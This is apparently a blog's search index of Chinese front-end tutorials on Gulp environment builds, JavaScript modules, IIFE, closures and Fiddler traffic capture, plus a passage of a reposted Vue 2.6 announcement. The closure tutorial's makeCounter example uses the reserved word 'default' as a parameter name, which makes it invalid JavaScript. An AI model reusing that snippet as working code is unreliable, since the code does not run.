<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Gulp 设置部署环境]]></title>
    <url>%2Fblob%2F2019-09-10-gulp-setup-deployment-environment%2F</url>
    <content type="text"><![CDATA[概述 某些项目使用 jenkins 做自动构建，一份代码可能会部署到多个环境，如：正式环境、预发布环境、测试环境、本地开发环境。运维不可能每次都去手动改变我们的代码，所以，就需要前端可以针对不同的部署环境进行构建配置。对于多人维护的项目应该有一个可以统一的本地开发环境，不需要每个人再去配置。 依赖支持 本方案使用的是 gulp-preprocess 插件，该插件可以构建一个可配置的上下文供我们在构建时使用。 同时使用 gulp-connect 支持本地开发的服务。 代码讲解 这一部分按照一个完整的简单项目进行分解。 公共部分。一次性将需要用到的变量引入 1234567891011121314151617 const &#123; series, parallel, src, dest, watch &#125; = require('gulp')const preprocess = require('gulp-preprocess')const connect = require('gulp-connect')const deleteFiles = require('delete')const DELETE_PATH = 'output/**'const OUTPUT_PATH = 'output/backend/'const COPY_PATH = [ '**', '!node_modules/**', '!output/**', '!.gitignore', '!gulpfile.js', '!package-lock.json', '!package.json', '!src/interface.js', // 此文件为需要根据不同环境配置不同环境变量] 清除文件。清除旧文件 123 function clean() &#123; return deleteFiles.promise([DELETE_PATH])&#125; 复制文件。该项目只需要复制特定文件到指定位置即可 1234 function copy() &#123; return src(COPY_PATH) .pipe(dest(OUTPUT_PATH))&#125; 处理特定文件。 12345678910 function buildInterface()&#123; return src(INTERFACE_PATH) .pipe(preprocess(&#123; context: &#123; // 此处可接受来自调用命令的 NODE_ENV 参数，默认为 online 线上环境 NODE_ENV: process.env.NODE_ENV || 'online', &#125;, &#125;)) .pipe(dest(OUTPUT_PATH + 'src'))&#125; 执行。 1234567 const build = series( clean, copy, buildInterface,)exports.build = build 本地开发服务器。 12345678 function connectDist() &#123; return connect.server(&#123; name: 'Dist App', root: 'output', port: 8052, livereload: true &#125;);&#125; 本地开发服务器热更新。 1234 function connectReload()&#123; return src(COPY_PATH) .pipe(connect.reload())&#125; 本地开发文件变化监听。 1234567891011121314151617 const buildReload = series( build, connectReload,)function watchFile()&#123; return watch(COPY_PATH, buildReload)&#125;exports.local = series( build, parallel( connectDist, watchFile, ),) 变量应用 in 12345678910111213141516171819202122232425 var interface = (function()&#123; return &#123; // @if NODE_ENV = 'local' key: 'local', loginPage: 'http://localhost:8052/backend/login.html', backendapi: 'http://backendapi.qa.xxxx.me', // @endif // @if NODE_ENV = 'qa' key: 'qa', loginPage: 'http://backend.qa.xxxx.me/login.html', backendapi: 'http://backendapi.qa.xxxx.me', // @endif // @if NODE_ENV = 'preview' key: 'preview', loginPage: 'http://backend.preview.xxxx.me/login.html', backendapi: 'http://backendapi.preview.xxxx.me', // @endif // @if NODE_ENV = 'online' key: 'online', loginPage: 'http://backend.xxxx.me/login.html', backendapi: 'http://backendapi.xxxx.me', // @endif &#125;&#125;)() out local 12345678 var interface = (function()&#123; return &#123; key: 'local', loginPage: 'http://localhost:8052/backend/login.html', backendapi: 'http://backendapi.qa.xxxx.me', &#125;&#125;)() out online 12345678 var interface = (function()&#123; return &#123; key: 'online', loginPage: 'http://backend.xxxx.me/login.html', backendapi: 'http://backendapi.xxxx.me', &#125;&#125;)() 完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980 const &#123; series, parallel, src, dest, watch &#125; = require('gulp')const preprocess = require('gulp-preprocess')const connect = require('gulp-connect')const deleteFiles = require('delete')const DELETE_PATH = 'output/**'const OUTPUT_PATH = 'output/backend/'const COPY_PATH = [ '**', '!node_modules/**', '!output/**', '!.gitignore', '!gulpfile.js', '!package-lock.json', '!package.json', '!src/interface.js',]const INTERFACE_PATH = 'src/interface.js'function clean() &#123; return deleteFiles.promise([DELETE_PATH])&#125;function copy() &#123; return src(COPY_PATH) .pipe(dest(OUTPUT_PATH))&#125;function buildInterface()&#123; return src(INTERFACE_PATH) .pipe(preprocess(&#123; context: &#123; // 此处可接受来自调用命令的 NODE_ENV 参数，默认为 online 线上环境 NODE_ENV: process.env.NODE_ENV || 'online', &#125;, &#125;)) .pipe(dest(OUTPUT_PATH + 'src'))&#125;function connectDist() &#123; return connect.server(&#123; name: 'Dist App', root: 'output', port: 8052, livereload: true &#125;);&#125;function connectReload()&#123; return src(COPY_PATH) .pipe(connect.reload())&#125;const build = series( clean, copy, buildInterface,)const buildReload = series( build, connectReload,)function watchFile()&#123; return watch(COPY_PATH, buildReload)&#125;exports.build = buildexports.local = series( build, parallel( connectDist, watchFile, ),) 调用 package.json 1234567891011121314 &#123; "scripts": &#123; "local": "set NODE_ENV=local&amp;&amp;gulp local", "qa": "set NODE_ENV=qa&amp;&amp;gulp build", "preview": "set NODE_ENV=preview&amp;&amp;gulp build", "online": "set NODE_ENV=online&amp;&amp;gulp build" &#125;, "devDependencies": &#123; "delete": "^1.1.0", "gulp": "^4.0.2", "gulp-connect": "^5.7.0", "gulp-preprocess": "^3.0.3" &#125;&#125; 本地开发：npm run local测试环境部署：npm run qa预发布环境部署：npm run preview线上环境部署：npm run online 参考 https://www.jianshu.com/p/bd2f97e16d86https://www.npmjs.com/package/gulp-preprocesshttps://www.npmjs.com/package/gulp-connect]]></content>
      <categories>
        <category>Gulp</category>
      </categories>
      <tags>
        <tag>Gulp</tag>
        <tag>部署环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模块化模式]]></title>
    <url>%2Fblob%2F2019-08-16-module-pattern%2F</url>
    <content type="text"><![CDATA[模块是闭包最强大的一种应用，在团队开发中是迫切需要的，可以更好的划分团队人员职能，做到精细化管理而互不干扰。 模块化的发展 初学者的代码 - 原始写法 作为一名初学者，写代码可能是一堆一堆的，所以为了好看一点，就把这一段代码包含在一个函数里面以供调用。 1234567 function m1()&#123; //...&#125;function m2()&#123; //...&#125; 上面的函数m1()和m2()，组成一个模块。使用的时候，直接调用就行了。 缺点是污染了全局变量，容易照成变量名冲突，各模块直接关系混乱。 如果代码都是大段大段的，最后导致写成了一堆无人能看懂的代码。 高级一点的代码 - 对象写法 所以就有人使用对象的写法 12345678910111213 var module1 = new Object(&#123; _count : 0, m1 : function ()&#123; //... &#125;, m2 : function ()&#123; //... &#125;&#125;); 上面的函数m1()和m2(），都封装在module1对象里。使用的时候，就是调用这个对象的属性。 但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。 1 module1._count = 5; 初具样子的代码 - 闭包写法 所以闭包来了，可以做到变量的私有化 12345678910111213141516171819202122 function CoolModule() &#123; var something = "cool"; var another = [1, 2, 3]; function doSomething() &#123; console.log( something ); &#125; function doAnother() &#123; console.log( another.join( " ! " ) ); &#125; return &#123; doSomething: doSomething, doAnother: doAnother &#125;;&#125;var foo = CoolModule();foo.doSomething(); // coolfoo.doAnother(); // 1 ! 2 ! 3 使用上面的写法，外部代码无法读取内部的something、another变量。 首先，CoolModule() 只是一个函数，但它 必须被调用 才能成为一个被创建的‘模块实例’（我们暂且叫foo为‘模块实例’或者‘实例’）。 第二，CoolModule() 函数返回一个对象。这个返回的对象拥有指向内部函数的引用，但是 没有 指向内部数据变量的引用；也可以看做是模块的公有API。我们也可以仅仅返回一个内部函数，jQuery 就是一个很好地例子。 这个返回值对象最终被赋值给外部变量 foo，然后我们可以在这个API上访问那些属性，比如 foo.doSomething()。 doSomething() 和 doAnother() 函数拥有模块“实例”内部作用域的闭包，也就是说foo拥有了访问模块词法作用域的能力。 这种方式可以可以重复创建多个‘实例’，如果想仅仅创建一个‘实例’，就要使用IIFE。 再次升级 - IIFE写法 所以立即调用函数表达式来了，做到了在代码加载成功之后自动创建一个‘实例’，并且不会再次创建一个新的‘实例’；因为没有同样的‘实例’，所以这个‘实例’是‘单例’的。 1234567891011121314151617181920 var foo = (function CoolModule() &#123; var something = "cool"; var another = [1, 2, 3]; function doSomething() &#123; console.log( something ); &#125; function doAnother() &#123; console.log( another.join( " ! " ) ); &#125; return &#123; doSomething: doSomething, doAnother: doAnother &#125;;&#125;)();foo.doSomething(); // coolfoo.doAnother(); // 1 ! 2 ! 3 模块的继承 如果一个模块很大要分成几个部分，或者要继承另一个模块，这是就要采用下面这种方式，同时最后一行的module1 || {}是必须的，防止浏览器异步加载导致的引用错误。 而且这样的好处是和外界完全隔离，也不需要在作用域链上进行疯狂的查找。 123456789 var module1 = (function (mod)&#123; mod.m3 = function () &#123; //... &#125;; return mod;&#125;)(module1 || &#123;&#125;); 模块间的相互引用 模块间的相互引用也是没有问题的，只是写法有点特殊。 12345678910111213141516171819202122232425262728293031323334 // 1. 首先注册模块实例var module1 = &#123;&#125;;var module2 = &#123;&#125;;// 2. 实现模块实例module1 = (function (mod1, mod2)&#123; mod1.m1 = function()&#123; console.log('--module1--'); &#125;; mod1.m2 = function() &#123; return mod2.m1() &#125; return mod1;&#125;)(module1 || &#123;&#125;, module2 || &#123;&#125;);module2 = (function (mod1, mod2)&#123; mod2.m1 = function()&#123; console.log('--module2--'); &#125;; mod2.m2 = function() &#123; return mod1.m1() &#125; return mod2;&#125;)(module1 || &#123;&#125;, module2 || &#123;&#125;);// 3. 调用模块实例方法module1.m2() // --module2--module2.m2() // --module1-- 这里要注意的是要先注册模块实例，然后再实现各模块实例，最后要在全部模块加载完代码之后再执行即可。 ES6模块 ES6 引入了模块化，其设计思想是在编译时就能确定模块的依赖关系，以及输入和输出的变量。 ES6 的模块化分为导出（export） @与导入（import）两个模块。 ES6 的模块自动开启严格模式，不管你有没有在模块头部加上 use strict;。 模块中可以导入和导出各种类型的变量，如函数，对象，字符串，数字，布尔值，类等。 每个模块都有自己的上下文，每一个模块内声明的变量都是局部变量，不会污染全局作用域。 每一个模块只加载一次（是单例的）， 若再去加载同目录下同文件，直接从内存中读取。 过渡阶段的模块 Commonjs AMD CMD 参考 https://github.com/holidaypenguin/You-Dont-Know-JS/blob/1ed-zh-CN/scope%20%26%20closures/ch5.mdhttp://www.ruanyifeng.com/blog/2012/10/javascript_module.html http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.htmlhttp://www.ruanyifeng.com/blog/2012/11/require_js.htmlhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/export https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/importhttps://www.jianshu.com/p/87a7827b2d73https://github.com/amdjs/amdjs-api/wiki/AMD-(%E4%B8%AD%E6%96%87%E7%89%88) https://github.com/amdjs/amdjs-api/wiki/require-(%E4%B8%AD%E6%96%87%E7%89%88)https://github.com/seajs/seajs/issues/242]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>闭包</tag>
        <tag>模块</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler 抓包工具总结]]></title>
    <url>%2Fblob%2F2019-08-08-summary-of-fiddler-packaging-tools%2F</url>
    <content type="text"><![CDATA[序章 Fiddler是一个蛮好用的抓包工具，可以将网络传输发送与接受的数据包进行截获、重发、编辑、转存等操作。也可以用来检测网络安全。反正好处多多，举之不尽呀！当年学习的时候也蛮费劲，一些蛮实用隐藏的小功能用了之后就忘记了，每次去网站上找也很麻烦，所以搜集各大网络的资料，总结了一些常用的功能。 Fiddler 下载地址 ：https://www.telerik.com/download/fiddler Fiddler 离线下载地址：https://pan.baidu.com/s/1bpnp3Ef 密码:5skw 下载Fiddler要翻墙，我费了好大得劲才翻出去下载到… win8之后用“Fiddler for .NET4”而win8之前用“Fiidler for .NET2”比较好 Fiddler 抓包简介 Fiddler是通过改写HTTP代理，让数据从它那通过，来监控并且截取到数据。当然Fiddler很屌，在打开它的那一瞬间，它就已经设置好了浏览器的代理了。当你关闭的时候，它又帮你把代理还原了，是不是很贴心。。。 字段说明 Fiddler想要抓到数据包，要确保Capture Traffic是开启，在File –&gt; Capture Traffic。开启后再左下角会有显示，当然也可以直接点击左下角的图标来关闭/开启抓包功能。 Fiddler开始工作了，抓到的数据包就会显示在列表里面，下面总结了这些都是什么意思： 名称 含义 # 抓取HTTP Request的顺序，从1开始，以此递增 Result HTTP状态码 Protocol 请求使用的协议，如HTTP/HTTPS/FTP等 Host 请求地址的主机名 URL 请求资源的位置 Body 该请求的大小 Caching 请求的缓存过期时间或者缓存控制值 Content-Type 请求响应的类型 Process 发送此请求的进程：进程ID Comments 允许用户为此回话添加备注 Custom 允许用户设置自定义值 图标 含义 请求已经发往服务器 已从服务器下载响应结果 请求从断点处暂停 响应从断点处暂停 请求使用 HTTP 的 HEAD 方法，即响应没有内容（Body） 请求使用 HTTP 的 POST 方法 请求使用 HTTP 的 CONNECT 方法，使用 HTTPS 协议建立连接隧道 响应是 HTML 格式 响应是一张图片 响应是脚本格式 响应是 CSS 格式 响应是 XML 格式 响应是 JSON 格式 响应是一个音频文件 响应是一个视频文件 响应是一个 SilverLight 响应是一个 FLASH 响应是一个字体 普通响应成功 响应是 HTTP/300、301、302、303 或 307 重定向 响应是 HTTP/304（无变更）：使用缓存文件 响应需要客户端证书验证 服务端错误 会话被客户端、Fiddler 或者服务端终止 Statistics 请求的性能数据分析 好了。左边看完了，现在可以看右边了 随意点击一个请求，就可以看到Statistics关于HTTP请求的性能以及数据分析了（不可能安装好了Fiddler一条请求都没有…）： Inspectors 查看数据内容 Inspectors是用于查看会话的内容，上半部分是请求的内容，下半部分是响应的内容： AutoResponder 允许拦截指定规则的请求 AutoResponder允许你拦截指定规则的求情，并返回本地资源或Fiddler资源，从而代替服务器响应。 看下图5步，我将“baidu”这个关键字与我电脑“f:\Users\YukiO\Pictures\boy.jpeg”这张图片绑定了，点击Save保存后勾选Enable rules，再访问baidu，就会被劫持。 这个玩意有很多匹配规则，如： \1. 字符串匹配（默认）：只要包含指定字符串（不区分大小写），全部认为是匹配 字符串匹配（baidu） 是否匹配 http://www.baidu.com 匹配 http://pan.baidu.com 匹配 http://tieba.baidu.com 匹配 \2. 正则表达式匹配：以“regex:”开头，使用正则表达式来匹配，这个是区分大小写的 字符串匹配（regex:.+.(jpg \&#124; gif \&#124; bmp ) $） 是否匹配 http://bbs.fishc.com/Path1/query=foo.bmp&amp;bar 不匹配 http://bbs.fishc.com/Path1/query=example.gif 匹配 http://bbs.fishc.com/Path1/query=example.bmp 匹配 http://bbs.fishc.com/Path1/query=example.Gif 不匹配 Composer 自定义请求发送服务器 Composer允许自定义请求发送到服务器，可以手动创建一个新的请求，也可以在会话表中，拖拽一个现有的请求 Parsed模式下你只需要提供简单的URLS地址即可（如下图，也可以在RequestBody定制一些属性，如模拟浏览器User-Agent） Filters 请求过滤规则 Fiters 是过滤请求用的，左边的窗口不断的更新，当你想看你系统的请求的时候，你刷新一下浏览器，一大片不知道哪来请求，看着碍眼，它还一直刷新你的屏幕。这个时候通过过滤规则来过滤掉那些不想看到的请求。 勾选左上角的Use Filters开启过滤器，这里有两个最常用的过滤条件：Zone和Host 1、Zone 指定只显示内网（Intranet）或互联网（Internet）的内容： 2、Host 指定显示某个域名下的会话： 如果框框为黄色（如图），表示修改未生效，点击红圈里的文字即可 Timeline 请求响应时间 在左侧会话窗口点击一个或多个（同时按下 Ctrl 键），Timeline 便会显示指定内容从服务端传输到客户端的时间： Fiddler 设置解密HTTPS的网络数据 Fiddler可以通过伪造CA证书来欺骗浏览器和服务器。Fiddler是个很会装逼的好东西，大概原理就是在浏览器面前Fiddler伪装成一个HTTPS服务器，而在真正的HTTPS服务器面前Fiddler又装成浏览器，从而实现解密HTTPS数据包的目的。 解密HTTPS需要手动开启，依次点击： \1. Tools –&gt; Fiddler Options –&gt; HTTPS \2. 勾选Decrypt HTTPS Traffic \3. 点击OK Fiddler 抓取Iphone / Android数据包 想要Fiddler抓取移动端设备的数据包，其实很简单，先来说说移动设备怎么去访问网络，看了下面这张图，就明白了。 可以看得出，移动端的数据包，都是要走wifi出去，所以我们可以把自己的电脑开启热点，将手机连上电脑，Fiddler开启代理后，让这些数据通过Fiddler，Fiddler就可以抓到这些包，然后发给路由器（如图）： \1. 打开Wifi热点，让手机连上（我这里用的360wifi，其实随意一个都行） \2. 打开Fidder，点击菜单栏中的 [Tools] –&gt; [Fiddler Options] \3. 点击 [Connections] ，设置代理端口是8888， 勾选 Allow remote computers to connect， 点击OK \4. 这时在 Fiddler 可以看到自己本机无线网卡的IP了（要是没有的话，重启Fiddler，或者可以在cmd中ipconfig找到自己的网卡IP） \5. 在手机端连接PC的wifi，并且设置代理IP与端口（代理IP就是上图的IP，端口是Fiddler的代理端口8888） \6. 访问网页输入代理IP和端口，下载Fiddler的证书，点击下图FiddlerRoot certificate 【注意】：如果打开浏览器碰到类似下面的报错，请打开Fiddler的证书解密模式（Fiddler 设置解密HTTPS的网络数据） 1 No root certificate was found. Have you enabled HTTPS traffic decryption in Fiddler yet? \7. 安装完了证书，可以用手机访问应用，就可以看到截取到的数据包了。（下图选中是布卡漫画的数据包，下面还有QQ邮箱的） Fiddler 内置命令与断点 Fiddler还有一个藏的很深的命令框，就是眼前，我用了几年的Fiddler都没有发现它，偶尔在别人的文章发现还有这个小功能，还蛮好用的，整理下记录在这里。 FIddler断点功能就是将请求截获下来，但是不发送，这个时候你可以干很多事情，比如说，把包改了，再发送给服务器君。还有balabala一大堆的事情可以做，就不举例子了。 命令 对应请求项 介绍 示例 ? All 问号后边跟一个字符串，可以匹配出包含这个字符串的请求 ?google &gt; Body 大于号后面跟一个数字，可以匹配出请求大小，大于这个数字请求 &gt;1000 &lt; Body 小于号跟大于号相反，匹配出请求大小，小于这个数字的请求 &lt;100 = Result 等于号后面跟数字，可以匹配HTTP返回码 =200 @ Host @后面跟Host，可以匹配域名 @www.baidu.com select Content-Type select后面跟响应类型，可以匹配到相关的类型 select image cls All 清空当前所有请求 cls dump All 将所有请求打包成saz压缩包，保存到“我的文档\Fiddler2\Captures”目录下 dump start All 开始监听请求 start stop All 停止监听请求 stop 断点命令 bpafter All bpafter后边跟一个字符串，表示中断所有包含该字符串的请求 bpafter baidu（输入bpafter解除断点） bpu All 跟bpafter差不多，只不过这个是收到请求了，中断响应 bpu baidu（输入bpu解除断点） bps Result 后面跟状态吗，表示中断所有是这个状态码的请求 bps 200（输入bps解除断点） bpv / bpm HTTP方法 只中断HTTP方法的命令，HTTP方法如POST、GET bpv get（输入bpv解除断点） g / go All 放行所有中断下来的请求 g 示例演示： ? &gt; &lt; = @ select cls dump 断点命令： 断点可以直接点击Fiddler下图的图标位置，就可以设置全部请求的断点，断点的命令可以精确设置需要截获那些请求。如下示例： 命令： bpafter bps bpv g / go 参考 https://www.cnblogs.com/yyhh/p/5140852.html]]></content>
      <categories>
        <category>Fiddler</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript立即调用函数表达式 IIFE]]></title>
    <url>%2Fblob%2F2019-07-29-javascript-calls-function-expression-iife-immediately%2F</url>
    <content type="text"><![CDATA[说到立即调用函数就要提到函数，但是函数这一部分请自行查看文档 JavaScript 指南 函数 JavaScript 参考 函数 使用 通常有两种写法： 1 (function()&#123; /* code */ &#125;()); 1 (function()&#123; /* code */ &#125;)(); 这里面使用了圆括号运算符，那么具体是什么原因，我们来看一下。 解析 在 Javascript 中，圆括号()是一种运算符，跟在函数名之后，表示调用该函数。 12345 function print(params) &#123; console.log(params);&#125;print('print test'); 如果我们为了减少代码的书写量，合并起来写。 123 function print(params) &#123; console.log(params);&#125;('print test') 代码是可以执行的，而且和上面一段代码是等价的；如果我的代码是仅仅执行一次，那就使用匿名函数去执行。 12345 function(params) &#123; console.log(params);&#125;('print test')// Chrome: Uncaught SyntaxError: Unexpected token (// Firefox: SyntaxError: function statement requires a name 会提示错误，而且Chrome和Firefox提示的错误信息还不相同；出现这个问题我们要先知道定义函数的方式： 函数声明 12345 function print(params) &#123; console.log(params);&#125;// 执行函数print('print test'); 函数表达式 123456 // 匿名函数创建var print = function (params) &#123; console.log(params);&#125;// 执行函数print('print test'); 123456 // 具名函数创建，这种方式可以在函数内部方便的调用自身var print = function print(params) &#123; console.log(params);&#125;// 执行函数print('print test'); 123456 // var print = (params) =&gt; &#123; console.log(params);&#125;// 执行函数print('print test'); 可以看到最后在指向函数的时候都是有一个函数名，通过函数名称执行函数。 同时我们还要知道function这个关键字即可以当作语句，也可以当作表达式。如果function关键字出现在行首，一律解释成语句。因此，JavaScript引擎看到行首是function关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了。 上面出现错误的代码既不是一个正确的函数声明，也不是一个函数表达式，所以就报错了。 解决方法就是不要让function出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面，也就是我们开篇提到的两个方法。 他们都是以圆括号开头，引擎就会认为后面跟的是一个表示式，而不是函数定义语句，所以就避免了错误。这就叫做“立即调用的函数表达式”（Immediately-Invoked Function Expression），简称 IIFE。 如果有多个IIFE则每一个IIFE后面都要有;，可能会报错。 拓展 任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果 123456789101112 var i = function()&#123; return 10; &#125;();true &amp;&amp; function()&#123; /* code */ &#125;();0, function()&#123; /* code */ &#125;();!function () &#123; /* code */ &#125;();~function () &#123; /* code */ &#125;();-function () &#123; /* code */ &#125;();+function () &#123; /* code */ &#125;();// new 关键字new function()&#123; /* code */ &#125;new function()&#123; /* code */ &#125;() // 只有传递参数时，才需要最后那个圆括号。 总结 IIFE（ 立即调用函数表达式）是一个在定义时就会立即执行的 JavaScript 函数。 123 (function () &#123; statements&#125;)(); 这是一个被称为 自执行匿名函数 的设计模式，主要包含两部分。第一部分是包围在 圆括号运算符 () 里的一个匿名函数，这个匿名函数拥有独立的词法作用域。这不仅避免了外界访问此 IIFE 中的变量，而且又不会污染全局作用域。 第二部分再一次使用 () 创建了一个立即执行函数表达式，JavaScript 引擎到此将直接执行函数。 JQuery 也使用此方式 123 (function( window, undefined) &#123; // jquery code&#125;)(window) IIFE结合闭包的是一种比较好的应用，通过闭包实现了隔离了作用域，还可以立即执行。这是模块化模式 参考 http://benalman.com/news/2010/11/immediately-invoked-function-expression/https://www.cnblogs.com/mrray1105/p/9150933.html https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8Fhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Errors/Unnamed_function_statement https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Functionshttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions http://javascript.ruanyifeng.com/grammar/function.html#toc23https://www.cnblogs.com/tomxu/archive/2011/12/31/2289423.htmlhttps://segmentfault.com/a/1190000003902899]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>IIFE</tag>
        <tag>立即执行函数</tag>
        <tag>立即调用函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闭包]]></title>
    <url>%2Fblob%2F2019-07-29-closure%2F</url>
    <content type="text"><![CDATA[说到闭包就要提到函数，但是函数这一部分请自行查看文档 JavaScript 指南 函数 JavaScript 参考 函数还要说到作用域和词法作用域， 什么是作用域？ 词法作用域 定义 看了那么多，自己也在总结，主要有一下几个关键的点： 闭包是函数和声明该函数的词法环境的组合。 闭包就是函数能够记住并访问它的词法作用域，即使当这个函数在它的词法作用域之外执行时。 JavaScript中的函数运行在它们被定义的词法作用域里，而不是它们被执行的词法作用域里。 总结成一句话是： 闭包是函数和声明该函数的词法环境的组合。而且函数能够记住并访问它的词法作用域，即使函数在它的词法作用域之外执行，也不会访问它们被执行的词法作用域。 （这里面使用的词法环境、词法作用域有待考证，因为原本只是认为是作用域，而作用域和词法作用域也可能是不同的） 特点： 实现了变量的私有化，隔离作用域不污染全局作用域。 不会被垃圾回收器回收作用域。 缺点： 增加了变量作用域链查找的长度，相对降低了性能。所以应该尽量减少闭包内变量查找作用域链的长度，或者不使用闭包。 解析 得见真容 12345678910111213 function foo() &#123; var a = 2; function bar() &#123; console.log( a ); &#125; return bar;&#125;var baz = foo();baz(); // 2 -- 哇噢，看到闭包了，伙计。 函数 bar() 对于 foo() 内的作用域拥有词法作用域访问权。但是之后，我们拿起 bar()，这个函数本身，将它像 值 一样传递。在这个例子中，我们 return bar 引用的函数对象本身。 在执行 foo() 之后，我们将它返回的值（我们的内部 bar() 函数）赋予一个称为 baz 的变量，然后我们实际地调用 baz()，这将理所当然地调用我们内部的函数 bar()，只不过是通过一个不同的标识符引用。 bar() 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。 一般来说函数在执行完之后会被 引擎 启用了垃圾回收器 回收不被使用的作用域；而闭包不会，闭包会持续对这个作用域保持使用 循环 + 闭包 一个经典的错误 12345 for (var i=1; i&lt;=5; i++) &#123; setTimeout( function timer()&#123; console.log( i ); &#125;, i*1000 );&#125; 我们最初的设想是间隔1000毫秒分别输出 1 2 3 4 5，事实却是间隔1000毫秒分别输出 6 6 6 6 6。为什么会这样呢？ 每一次执行setTimeout的回调函数都会产生一个闭包，但是这些闭包使用的是同一个词法作用域，而最后i变成了6，所以最后输出的都是6。解决这个问题还是有方法的。 以毒攻毒 - 用闭包解决： 12345678 function delay(i) &#123; setTimeout( function timer()&#123; console.log( i ); &#125;, i*1000 );&#125;for (var i=1; i&lt;=5; i++) &#123; delay(i)&#125; for 循环时会创建一个新的词法作用域，且多个词法作用域是互不干扰的。 也可以使用IIFE解决： 1234567 for (var i=1; i&lt;=5; i++) &#123; (function(j)&#123; setTimeout( function timer()&#123; console.log( j ); &#125;, j*1000 ); &#125;)(i);&#125; 块作用域，使用 let 声明，这个变量将不是只为循环声明一次，而是为每次迭代声明一次。 12345 for (let i=1; i&lt;=5; i++) &#123; setTimeout( function timer()&#123; console.log( i ); &#125;, i*1000 );&#125; 用闭包模拟私有方法 有些编程语言是支持私有方法的，而 JavaScript 没有这种原生支持，但我们可以使用闭包来模拟私有方法。 私有方法不仅仅有利于限制对代码的访问：还提供了管理全局命名空间的强大能力，避免非核心的方法弄乱了代码的公共接口部分。 1234567891011121314151617181920212223242526272829 var makeCounter = function(default) &#123; var privateCounter = default || 0; function changeBy(val) &#123; privateCounter += val; &#125; return &#123; increment: function() &#123; changeBy(1); &#125;, decrement: function() &#123; changeBy(-1); &#125;, value: function() &#123; return privateCounter; &#125; &#125; &#125;;var Counter1 = makeCounter(2);var Counter2 = makeCounter(10);console.log(Counter1.value()); /* logs 2 */Counter1.increment();Counter1.increment();console.log(Counter1.value()); /* logs 4 */Counter1.decrement();console.log(Counter1.value()); /* logs 3 */console.log(Counter2.value()); /* logs 10 */ 我们定义了 makeCounter 函数工厂创建了两个新函数 — 一个将以2作为开始，另一个以10作为开始。 Counter1 和 Counter2 都是闭包。它们共享相同的函数定义，但是保存了不同的词法环境且不互相影响。 其实这又被称为模块。 模块 关于模块的部分模块化模式 参考 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closureshttps://www.zhihu.com/question/34547104https://github.com/holidaypenguin/You-Dont-Know-JS/blob/1ed-zh-CN/scope%20%26%20closures/ch5.md]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue 2.6 发布了]]></title>
    <url>%2Fblob%2F2019-07-16-vue-2.6-was-released%2F</url>
    <content type="text"><![CDATA[vue 2.6 版本发布已经很久了，赶在3.0发布之前熟悉并使用新版内容，为了3.0做准备该文章为转发尤雨溪大神的Vue 2.6 发布了 英文原文：https://medium.com/the-vue-point/vue-2-6-released-66aa6c8e785e 昨天刚刚庆祝了 Vue 发布五周年，今天我们趁热打铁在年三十发布了 Vue 2.6 “Macross”，祝大家新春快乐！ 在过去一年里面我们花了大量的精力在新版的 CLI 和 3.0 的设计/原型调研上，因此 Vue 2.x 相对地已经很久没有重大更新了。差不多是时候了！这次的 2.6 包含了一些相当有份量的更新，我们在这里会讨论一些亮点——具体细节还请移步完整的 release note。 Slots：新语法，性能优化，准备接轨 3.0 Slot /插槽 是 Vue 组件的一个重要机制，因为它使得完全解耦的组件之间可以灵活地被组合。在 3.0 的原型开发过程中，我们发现了一些可以进一步改善现有的 slot 机制的方法。这里面有些可能会需要少量破坏性的改动，但也有一些可以以完全向后兼容的方式被引入 2.x。对于那些需要破坏性改动的改进，我们也尽量通过在 2.x 中引入完全兼容的改动来渐进地跟 3.0 的 API 接轨。 新语法 首先，我们为 slot 引入了一套全新的模版语法。语法改动是我们很少做的事情（这也是 3.0 唯一计划改的语法），所以我们尝试了多种不同的设计，并且进行了大量的讨论。最终我们敲定了基于新的 v-slot 指令的语法（具体设计细节见 RFC）。这里是两个简略的例子： 默认作用域插槽 (default scoped slot) 123 &lt;my-component v-slot="&#123; msg &#125;"&gt; &#123;&#123; msg &#125;&#125;&lt;/my-component&gt; 具名插槽 (named slots) 1234567891011121314 &lt;my-component&gt; &lt;template v-slot:header&gt; &lt;p&gt;Header&lt;/p&gt; &lt;/template&gt; &lt;template v-slot:item="&#123; data &#125;"&gt; &lt;h2&gt;&#123;&#123; data.title &#125;&#125;&lt;/h2&gt; &lt;p&gt;&#123;&#123; data.text &#125;&#125;&lt;/p&gt; &lt;/template&gt; &lt;template v-slot:footer&gt; &lt;p&gt;Footer&lt;/p&gt; &lt;/template&gt;&lt;/my-component&gt; 新语法将普通的插槽 (slot) 和作用域插槽 (scoped slot) 统一在一个指令语法下，并在整体上强调明确性 (explicitness) 和一致性 (consistency)。同时，由于新语法和旧语法完全兼容，这使得我们可以在 2.6 中发布它。 如果你已经熟悉现有的 